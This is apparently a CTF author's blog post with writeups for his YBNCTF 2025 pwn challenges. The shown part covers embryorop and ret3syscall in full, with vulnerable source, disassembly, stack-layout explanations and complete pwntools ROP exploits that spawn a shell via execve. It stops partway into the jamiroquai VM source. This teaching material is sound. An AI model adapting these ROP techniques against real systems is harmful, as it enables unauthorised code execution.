@@ -1,0 +1,1666 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>YBNCTF 2025</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>Nikola's blog</h1>
+    <span>ctf and stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">About</a> /
+    <a id="articles"class="info-link"href="/articles.html">Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        YBNCTF 2025
+      </h1>
+      
+        <h2 id="article-subtitle">
+          Writeups for the pwn challenges I wrote
+        </h2>
+      
+      <time id="article-date">
+        2026.1.9
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><a href="#pwn%2Fembryorop">pwn/embryorop</a><ul><li><a href="#challenge-protections">Challenge Protections</a><li><a href="#challenge">Challenge</a><li><a href="#challenge-analysis">Challenge Analysis</a><ul><li><a href="#how-functions-use-the-stack">How Functions Use The Stack</a></ul><li><a href="#back-to-the-challenge">Back to the challenge</a><li><a href="#exploit">Exploit</a></ul><li><a href="#pwn%2Fret3syscall">pwn/ret3syscall</a><ul><li><a href="#challenge-protections-1">Challenge Protections</a><li><a href="#challenge-1">Challenge</a><li><a href="#stack-in-aarch64">Stack In Aarch64</a><li><a href="#relooking-at-the-challenge">Relooking at the Challenge</a><ul><li><a href="#first-rop">first rop</a></ul><li><a href="#second-rop">second rop</a></ul><li><a href="#pwn%2Fjamiroquai">pwn/jamiroquai</a><ul><li><a href="#challenge-protections-2">Challenge Protections</a><li><a href="#challenge-2">Challenge</a><ul><li><a href="#how-does-the-vm-work%3F">How does the VM work?</a></ul><li><a href="#challenge-analysis-1">Challenge Analysis</a><ul><li><a href="#vulnerability">Vulnerability</a><li><a href="#solve-process">Solve Process</a><li><a href="#fsop">FSOP</a></ul></ul><li><a href="#pwn%2Fbad-apple-2">pwn/bad apple 2</a><ul><li><a href="#challenge-protections-3">Challenge Protections</a><li><a href="#challenge-3">Challenge</a><li><a href="#house-of-apple%E2%80%A6-to-where%3F">House of Apple… to where?</a></ul><li><a href="#pwn%2Fhshell">pwn/hshell</a><ul><li><a href="#challenge-protections-4">Challenge Protections</a><li><a href="#challenge-4">Challenge</a><li><a href="#challenge-analysis-2">Challenge Analysis</a><li><a href="#challenge-analysis-3">Challenge Analysis</a><ul><li><a href="#use-after-free-(uaf)-vulnerability">Use-After-Free (UAF) Vulnerability</a><li><a href="#leakless-heap">Leakless Heap</a><li><a href="#overlapping-chunks-and-remaindering">Overlapping Chunks and Remaindering</a><li><a href="#getting-our-leak">Getting Our Leak</a><li><a href="#remote-code-execution">Remote Code Execution</a></ul></ul></ul></div><p></p>
+</details>
+<p>YBNCTF 2025 was a CTF competition hosted by the Yes But No team, for which I contributed five pwn challenges:</p>
+<ul>
+<li>pwn/embryorop</li>
+<li>pwn/ret3syscall</li>
+<li>pwn/jamiroquai</li>
+<li>pwn/bad apple 2</li>
+<li>pwn/hshell</li>
+</ul>
+<h1 id="pwn%2Fembryorop"tabindex="-1">pwn/embryorop</h1>
+<h2 id="challenge-protections"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/ybn25/embryorop/dist/chal'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+</code></pre>
+<h2 id="challenge"tabindex="-1">Challenge</h2>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">e</span><span class="hljs-params">()</span> {
+	_exit(<span class="hljs-number">0</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+	<span class="hljs-type">char</span> local[<span class="hljs-number">0x100</span>];
+	<span class="hljs-built_in">memset</span>(local, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(local));
+	<span class="hljs-type">void</span> (*func)() = e;
+	read(<span class="hljs-number">0</span>, local, <span class="hljs-number">0x110</span>);
+	__asm__(<span class="hljs-string">&quot;jmp *%0&quot;</span> :: <span class="hljs-string">&quot;r&quot;</span>(func));
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>Simple binary, given a buffer, we are given an overflow into the buffer right before the saved RBP value, overwriting the function pointer that is initialised to the <code>e()</code> function.</p>
+<p>The binary is statically linked, meaning we have tons of gadgets in the binary itself <strong>including syscall gadgets</strong>. Hence, we could find some way to set the registers for an <code>execve</code> syscall to pop a shell.</p>
+<p>We are not able to overwrite the return address.</p>
+<h2 id="challenge-analysis"tabindex="-1">Challenge Analysis</h2>
+<p>When we have a stack problem such as this, it is more so important that we look at the disassembly. This is so we are able to see where RSP resides, in order to get stack control and achieve execution flow control:</p>
+<pre class="hljs"><code>   push   rbp
+   mov    rbp,rsp
+   sub    rsp,0x110
+   lea    rax,[rbp-0x110]
+   mov    edx,0x100
+   mov    esi,0x0
+   mov    rdi,rax
+   call   0x400320
+   mov    QWORD PTR [rbp-0x8],0x401a25
+   lea    rax,[rbp-0x110]
+   mov    edx,0x110
+   mov    rsi,rax
+   mov    edi,0x0
+   call   0x411c60 &lt;read&gt;
+   mov    rax,QWORD PTR [rbp-0x8]
+   jmp    rax
+   mov    eax,0x0
+   leave
+   ret
+</code></pre>
+<p>Notice that at the beginning of the function, rsp is decremented by 0x110 from its original value, stored in rbp.
+Note also that the buffer begins at rbp-0x110. Hence, rsp is right at the start of our buffer. Why is this so?</p>
+<h3 id="how-functions-use-the-stack"tabindex="-1">How Functions Use The Stack</h3>
+<p>At the beginning of every function, stack space is allocated by subtracting from the stack pointer, rsp. We first store the original value of rsp into rbp, before we decrement rsp to allocate the stack space:</p>
+<pre class="hljs"><code>   push   rbp
+   mov    rbp,rsp
+   sub    rsp,0x110
+</code></pre>
+<p>At the end of the function, in order to restore the previous stack frame before the current function call, the function executes:</p>
+<pre class="hljs"><code>   leave
+   ret
+</code></pre>
+<p>which translates to:</p>
+<pre class="hljs"><code>   mov rsp, rbp
+   pop rbp ; leave
+   pop rip ; ret
+</code></pre>
+<p>Note that the <code>ret</code> instruction simply pops the value at rsp into rip. Hence, it is important for the program to restore the stack pointer to its original value from rsp before executing a <code>ret</code>.</p>
+<h2 id="back-to-the-challenge"tabindex="-1">Back to the challenge</h2>
+<p>Recall the stack layout:</p>
+<pre class="hljs"><code>gef&gt; x/gx $rbp-0x110
+0x7fffffffce90:	0x0000000000000000
+gef&gt; x/gx $rsp
+0x7fffffffce90:	0x0000000000000000
+gef&gt;
+</code></pre>
+<p>rsp happens to be right at the beginning of the buffer. In normal circumstances, the program would execute</p>
+<pre class="hljs"><code>   leave
+   ret
+</code></pre>
+<p>which would restore rsp to the value of rbp. However, if we instead overwrote <code>&amp;e()</code> to point to a <code>ret</code> instruction,</p>
+<pre class="hljs"><code>pop rip ; rsp = $rbp-0x110 
+</code></pre>
+<p>would be executed, popping the address at the start of the buffer right into the instruction pointer. This gives us a way to ROP by writing our rop chain from the beginning of the buffer.</p>
+<h2 id="exploit"tabindex="-1">Exploit</h2>
+<p>Now that we have a way to control RIP, we can write our standard rop chain to set up an <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> syscall. In order to do this, we will have to:</p>
+<ol>
+<li>Write the “/bin/sh” string somewhere in memory</li>
+<li>Set up the registers (rdi=&amp;“/bin/sh”, rsi=0, rdx=0, rax=<code>constants.SYS_execve</code>)</li>
+<li>ret2syscall!</li>
+</ol>
+<p>In order to write the /bin/sh string to the memory, I found a handy <code>mov qword ptr</code> gadget to write the string to the BSS:</p>
+<pre class="hljs"><code>0x41bfa0 &lt;__ctype_init+80&gt;:	mov    QWORD PTR [rdx],rax
+</code></pre>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+
+elf = context.binary = ELF(<span class="hljs-string">&quot;./chal&quot;</span>)
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>
+
+<span class="hljs-comment"># p = process()</span>
+<span class="hljs-comment"># p = process([&#x27;python3&#x27;, &#x27;challenge.py&#x27;])</span>
+p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>)
+
+MOV_RDXPTR_RAX = <span class="hljs-number">0x000000000041bfa0</span>
+
+rop = ROP(elf)
+rop.rdi = <span class="hljs-number">0x4a8000</span>
+rop.rsi = <span class="hljs-number">0</span>
+rop.raw(<span class="hljs-number">0x0000000000468eca</span>) <span class="hljs-comment"># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
+rop.raw(<span class="hljs-number">0x4a8000</span>) <span class="hljs-comment"># bss address</span>
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.rax = <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>
+rop.raw(MOV_RDXPTR_RAX)
+rop.raw(<span class="hljs-number">0x0000000000468eca</span>) <span class="hljs-comment"># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.rax = <span class="hljs-number">0x3b</span>
+rop.raw(<span class="hljs-number">0x000000000040068b</span>) <span class="hljs-comment"># syscall</span>
+rop.raw(<span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x110</span> - <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(rop.chain())))
+rop.raw(rop.ret[<span class="hljs-number">0</span>]) <span class="hljs-comment"># e()</span>
+
+p.send(rop.chain())
+
+p.interactive()
+</code></pre>
+<h1 id="pwn%2Fret3syscall"tabindex="-1">pwn/ret3syscall</h1>
+<p>ret3syscall was an aarch64 ROP challenge I wrote to be a guided challenge for intermediate players who had already gotten used to generic x86_64 ROP problems.</p>
+<h2 id="challenge-protections-1"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/ybn25/ret3syscall/solution/chal'
+    Arch:       aarch64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+</code></pre>
+<h2 id="challenge-1"tabindex="-1">Challenge</h2>
+<pre class="hljs"><code>   0x0000000000410494 &lt;+0&gt;:     stp     x29, x30, [sp, #-32]!
+   0x0000000000410498 &lt;+4&gt;:     mov     x29, sp
+   0x000000000041049c &lt;+8&gt;:     add     x0, sp, #0x10
+   0x00000000004104a0 &lt;+12&gt;:    mov     x2, #0x300              
+        // #768
+   0x00000000004104a4 &lt;+16&gt;:    mov     x1, x0
+   0x00000000004104a8 &lt;+20&gt;:    mov     w0, #0x0                
+        // #0
+   0x00000000004104ac &lt;+24&gt;:    bl      0x421060 &lt;__libc_read&gt;
+   0x00000000004104b0 &lt;+28&gt;:    nop
+   0x00000000004104b4 &lt;+32&gt;:    ldp     x29, x30, [sp], #32
+   0x00000000004104b8 &lt;+36&gt;:    ret
+</code></pre>
+<p>The binary is a statically-linked binary that gives us a buffer overflow. The prompts give us the following four gadgets:</p>
+<pre class="hljs"><code>0x0000000000427094: str x0, [x1]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret; 
+0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16; 
+0x0000000000442990: mov x8, x6; svc #0; ret;
+0x000000000041112c: mov x2, #0; mov x3, #8; mov x8, #0x87; svc #0; ldp x29, x30, [sp], #0x20; ret;
+</code></pre>
+<p>But first, how does the stack work in aarch64?</p>
+<h2 id="stack-in-aarch64"tabindex="-1">Stack In Aarch64</h2>
+<p>The main difference between how the stack works in aarch64 and x86_64 is whether stack pointer incrementation/decrementation is mostly <strong>explicit</strong> or <strong>implicit</strong>.</p>
+<p>In x86_64, stack operations include:</p>
+<ul>
+<li><code>pop &lt;reg&gt;</code>: which copies the value that the stack pointer (sp) is pointing to into the register specified and increments sp implicitly by 8.</li>
+<li><code>push &lt;value&gt;</code>: which decrements sp by 8 and copies the value into the location sp is pointing to.</li>
+</ul>
+<p>In most programs, programs either use push or pop to operate on the stack, which implicitly increment or decrement sp by 8.</p>
+<p>What this means is that the stack pointer is predictable enough for a trivial ROP chain layout in x86_64. Since pop and push operations modify the stack pointer by a fixed size of 8, gadgets as well as the corresponding values to be popped into registers can be placed contiguous to each other as such:</p>
+<pre class="hljs"><code>0x00: 0x404830     # pop rdi ; ret
+0x08: 0xdeadbeef   
+0x10: 0x404836	   # pop rsi ; ret 
+0x18: 0xcafebabe
+0x20: &lt;address of next gadget&gt;
+</code></pre>
+<p>As <code>pop</code>, <code>push</code>, <code>ret</code> all increment or decrement the stack pointer by 8, it is possible to put our addresses in a contiguous order without having to care as much about the offset at which to place the next gadget.</p>
+<p>However, in aarch64, the stack as well as the operations are different:</p>
+<ol>
+<li>the <code>ret</code> instruction does not pop the return address of sp. Instead, <code>ret</code> simply moves the value in the return address register (x30) into the instruction pointer (pc).</li>
+<li>There is no actual “push” or “pop” operation. Instead, there are load operations which reference specific offsets of sp, <strong>without necessarily incrementing sp afterwards.</strong></li>
+</ol>
+<p>For example, referring to one of the gadgets given:</p>
+<pre class="hljs"><code>0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; add sp, sp, #0xe0; br x16; 
+</code></pre>
+<p>The <code>ldp</code> (load-pair) instruction in this gadget loads a pair of 8 byte values into x0 and x1 at sp+0x20.</p>
+<p>Suppose we had a write directly on to the address sp is pointing to. Then, we would have to set x0, x1 because they are argument registers, as well as x16 to control execution flow. In order to do that, the payload have to look like the following:</p>
+<pre class="hljs"><code>sp+0x00: 0x4141414141414141 # dummy
+sp+0x08: 0xaabbccddeeffgg00 # x16
+sp+0x10: 0x4141414141414141 # dummy
+sp+0x18: 0x4141414141414141 # dummy
+sp+0x20: 0xdeadbeef	    # x0 
+sp+0x28: 0xcafebabe         # x1
+sp+0x30: 0x4141414141414141 # dummy
+sp+0x38: ...
+...
+sp+0xe0: &lt;next stack frame&gt; 
+</code></pre>
+<p>As such, it is necessarily to keep track explicity of the incrementation and decrementation of the stack pointer within and before each gadget.</p>
+<h2 id="relooking-at-the-challenge"tabindex="-1">Relooking at the Challenge</h2>
+<p>The challenge is a statically-linked binary. This means that we will have to perform a ret2syscall chain where:</p>
+<ol>
+<li>We write the /bin/sh string to the BSS</li>
+<li>Then, we perform a ret2syscall using the BSS address with the /bin/sh string as the first argument.</li>
+</ol>
+<p>In order to write our /bin/sh string, we will use the following gadget:</p>
+<pre class="hljs"><code>0x0000000000427094: str x0, [x1]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret; 
+</code></pre>
+<p>which would store the 8 byte value of x0 into the address at x1. However, we need to set x0 and x1 first. Hence, we will first use this gadget:</p>
+<pre class="hljs"><code>0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16; 
+</code></pre>
+<p>which loads x0 and x1 from the stack at sp+0x20. Let us first craft a payload that writes our string to the BSS.</p>
+<h3 id="first-rop"tabindex="-1">first rop</h3>
+<p>How do we control execution flow? Much like x86_64, we can do this by overwriting the “saved return address” on the stack. However, it is not guaranteed that we will overwrite the return address of the very same frame we are in:</p>
+<pre class="hljs"><code>Dump of assembler code for function buf:
+   0x0000000000410494 &lt;+0&gt;:     stp     x29, x30, [sp, #-32]!
+   0x0000000000410498 &lt;+4&gt;:     mov     x29, sp
+   0x000000000041049c &lt;+8&gt;:     add     x0, sp, #0x10
+   0x00000000004104a0 &lt;+12&gt;:    mov     x2, #0x300              
+        // #768
+   0x00000000004104a4 &lt;+16&gt;:    mov     x1, x0
+   0x00000000004104a8 &lt;+20&gt;:    mov     w0, #0x0                
+        // #0
+   0x00000000004104ac &lt;+24&gt;:    bl      0x421060 &lt;__libc_read&gt; ; read(0, sp+0x10, 0x300)
+   0x00000000004104b0 &lt;+28&gt;:    nop
+   0x00000000004104b4 &lt;+32&gt;:    ldp     x29, x30, [sp], #32
+   0x00000000004104b8 &lt;+36&gt;:    ret
+</code></pre>
+<p>Notice that since <code>__libc_read</code> reads onto sp+0x10, we are not able to directly modify the saved return address at sp.</p>
+<p>However, let us look at the disassembly of <code>main</code>:</p>
+<pre class="hljs"><code>Dump of assembler code for function main:
+   0x00000000004104bc &lt;+0&gt;:     stp     x29, x30, [sp, #-32]!
+   0x00000000004104c0 &lt;+4&gt;:     mov     x29, sp
+   0x00000000004104c4 &lt;+8&gt;:     adrp    x0, 0x4b0000
+   0x00000000004104c8 &lt;+12&gt;:    add     x0, x0, #0x5c0
+   0x00000000004104cc &lt;+16&gt;:    ldr     x0, [x0]
+   0x00000000004104d0 &lt;+20&gt;:    mov     x1, #0x0                
+   0x00000000004104d4 &lt;+24&gt;:    bl      0x4118e0 &lt;setbuf&gt;
+   0x00000000004104d8 &lt;+28&gt;:    adrp    x0, 0x4b0000
+   0x00000000004104dc &lt;+32&gt;:    add     x0, x0, #0x5b8
+   0x00000000004104e0 &lt;+36&gt;:    ldr     x0, [x0]
+   0x00000000004104e4 &lt;+40&gt;:    mov     x1, #0x0                
+   0x00000000004104e8 &lt;+44&gt;:    bl      0x4118e0 &lt;setbuf&gt;
+   &lt;snip&gt; 
+   0x000000000041078c &lt;+720&gt;:   bl      0x410494 &lt;buf&gt;
+   0x0000000000410790 &lt;+724&gt;:   mov     w0, #0x0                
+   0x0000000000410794 &lt;+728&gt;:   ldp     x29, x30, [sp], #32
+   0x0000000000410798 &lt;+732&gt;:   ret
+ 
+</code></pre>
+<p>Let us take note of the specific decrementation and incrementation of sp from the start of <code>main</code> to the end of <code>buf</code>:</p>
+<ol>
+<li>sp = sp - 0x20</li>
+<li>let orig = sp: x29 and x30 are pushed at orig.</li>
+<li><code>main</code> calls <code>buf</code>: sp = orig - 32</li>
+<li><code>read</code> is called onto sp+0x10</li>
+<li>sp = (orig - 32) + 32 = orig</li>
+</ol>
+<p>To put it into perspective:</p>
+<pre class="hljs"><code>sp+0x00: 
+sp+0x08: 
+sp+0x10: &lt;read&gt;
+sp+0x18: 
+sp+0x20: &lt;orig&gt; &lt;- where the x29 and x30 values of main are saved!
+</code></pre>
+<p>Hence, we can overwrite the return address of <code>main</code> instead of <code>buf</code> 0x10 characters after the beginning of the buffer.
+We can thus craft an initial payload that would perform our /bin/sh string write to a location in the BSS, and then return back to main.</p>
+<p>Let us take a look at the gadgets that we have:</p>
+<ol>
+<li><code>str x0, [x1]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret</code></li>
+<li><code>ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16;</code></li>
+</ol>
+<p>Since we are going to use (2) to load x0 and x1 first to perform our write, we must also load x16 to the address of (1) so that we can jump there to perform our write.</p>
+<p>Note also that at the end of (2), sp is incremented by 0xe0, hence anything relating to the stack at (1) must be done relative to this addition of 0xe0.</p>
+<p>Furthermore, note that at the end of <code>main()</code>, there is an increment of 32 (0x10) after the return address is loaded at sp.</p>
+<p>We can draft a layout as such:</p>
+<pre class="hljs"><code>0x00:             b'A'*8
+0x08:             b'A'*8
+0x10:             &lt;dummy x29 value&gt; 
+0x18:             &lt;address of (2)&gt; # x30
+...
+0x10+0x20:        &lt;stack frame of (2)&gt;
+0x10+0x20+0x8:    &lt;address of (1)&gt; # x16
+0x10+0x20+0x20:   x0=/bin/sh\x00
+0x10+0x20+0x28:   &lt;bss address&gt;
+...
+0x10+0x20+0xe0:   &lt;stack frame of (1)&gt;
+0x10+0x20+0xe0:   &lt;dummy x29 value&gt;
+0x10+0x20+0xe8:   &lt;address of main()&gt;
+</code></pre>
+<pre class="hljs"><code><span class="hljs-string">&#x27;&#x27;&#x27;
+0x0000000000427094: str x0, [x1]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret; 
+0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16; 
+0x0000000000442990: mov x8, x6; svc #0; ret;
+0x000000000041112c: mov x2, #0; mov x3, #8; mov x8, #0x87; svc #0; ldp x29, x30, [sp], #0x20; ret;
+&#x27;&#x27;&#x27;</span>
+
+payload = flat({
+    <span class="hljs-number">0x10</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x430418</span>], <span class="hljs-comment"># return address</span>
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>: <span class="hljs-number">0x427094</span>, <span class="hljs-comment"># x16</span>
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x21</span>+<span class="hljs-number">0x20</span>: [u64(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>), <span class="hljs-number">0x4b4580</span>], <span class="hljs-comment"># x0, x1</span>
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0xe0</span>: [<span class="hljs-number">0</span>, elf.sym.main]
+})
+
+p.send(payload)
+</code></pre>
+<p>This performs our write! Now, we will have to ROP to get our <code>execve</code> syscall.</p>
+<h2 id="second-rop"tabindex="-1">second rop</h2>
+<p>As we are back at <code>main()</code> (and technically, <code>buf()</code>), we have the exact same buffer overflow on the same stack layout.
+In order to get the execve syscall right, we will have to set x0, x1, and x2 as the first three arguments, as well as x8.</p>
+<p>Hence, we can use these three gadgets to do so:</p>
+<ol>
+<li><code>0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16;</code></li>
+<li><code>0x0000000000442990: mov x8, x6; svc #0; ret;</code></li>
+<li><code>0x000000000041112c: mov x2, #0; mov x3, #8; mov x8, #0x87; svc #0; ldp x29, x30, [sp], #0x20; ret;</code></li>
+</ol>
+<p>We can first use (3) to set x2 to NULL which is required for our execve call. Then, we use (1) to set x0, x1, and x6 so that x8 will be set by x6 in (2).</p>
+<p>This gives us a layout as such:</p>
+<pre class="hljs"><code>0x00:             b'A'*8
+0x08:             b'A'*8
+0x10:             &lt;dummy x29 value&gt; 
+0x18:             &lt;address of (3)&gt; # x30
+...
+0x10+0x20:        &lt;stack frame of (1)&gt;
+0x10+0x20+0x8:    &lt;address of (2)&gt; # x16
+0x10+0x20+0x20:   x0=bss address
+0x10+0x20+0x28:   x1=NULL
+0x10+0x20+0x38:   w6=constants.SYS_execve
+</code></pre>
+<p>this gives us the shell:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep
+
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+elf = context.binary = ELF(<span class="hljs-string">&quot;./chal&quot;</span>)
+context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>
+
+<span class="hljs-comment">#p = process([&#x27;qemu-aarch64&#x27;, &#x27;./chal&#x27;])</span>
+<span class="hljs-comment">#p = remote(&#x27;localhost&#x27;, 8080)</span>
+p = remote(<span class="hljs-string">&#x27;tcp.ybn.sg&#x27;</span>, <span class="hljs-number">19229</span>)
+
+<span class="hljs-string">&#x27;&#x27;&#x27;
+0x0000000000427094: str x0, [x1]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x40; ret; 
+0x0000000000430418: ldp x0, x1, [sp, #0x20]; ldr x16, [sp, #8]; ldr w7, [sp, #4]; ldr w6, [sp, #0x38]; add sp, sp, #0xe0; br x16; 
+0x0000000000442990: mov x8, x6; svc #0; ret;
+0x000000000041112c: mov x2, #0; mov x3, #8; mov x8, #0x87; svc #0; ldp x29, x30, [sp], #0x20; ret;
+&#x27;&#x27;&#x27;</span>
+
+sleep(<span class="hljs-number">1</span>)
+payload = flat({
+    <span class="hljs-number">0x10</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x430418</span>],
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>: <span class="hljs-number">0x427094</span>, <span class="hljs-comment"># x16</span>
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>: [u64(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>), <span class="hljs-number">0x4b4580</span>],
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0xe0</span>: [<span class="hljs-number">0</span>, elf.sym.main]
+})
+
+p.send(payload)
+
+payload = flat({
+    <span class="hljs-number">0x10</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x41112c</span>],
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x430418</span>],
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>: <span class="hljs-number">0x442990</span>, <span class="hljs-comment"># x16</span>
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>: [<span class="hljs-number">0x4b4580</span>, <span class="hljs-number">0</span>],
+    <span class="hljs-number">0x10</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x20</span>+<span class="hljs-number">0x38</span>: <span class="hljs-number">0xdd</span>,
+})
+
+sleep(<span class="hljs-number">1</span>)
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="pwn%2Fjamiroquai"tabindex="-1">pwn/jamiroquai</h1>
+<h2 id="challenge-protections-2"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/ybn25/jamiroquai/src/main'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+</code></pre>
+<h2 id="challenge-2"tabindex="-1">Challenge</h2>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM_REGS 10</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PROG 0x1000</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE 0x1000</span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> MEM_SIZE 0x1000</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> REG(i) (vm-&gt;regs[i])</span>
+
+<span class="hljs-class"><span class="hljs-keyword">enum</span> {</span>
+	R0,
+	R1,
+	R2,
+	R3,
+	R4,
+	R5,
+	R6,
+	R7,
+	SP,
+	BP
+};
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> {</span>
+	SYS_READ,
+	SYS_WRITE
+} Syscall;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> {</span>
+	OP_HALT,
+	OP_MOV,
+	OP_LOADI,
+	OP_LOAD, 
+	OP_STORE,
+	OP_ADD,
+	OP_SUB,
+	OP_MUL,
+	OP_DIV,
+	OP_PRINT,
+	OP_JMP,
+	OP_CALL,
+	OP_RET,
+	OP_SYSCALL,
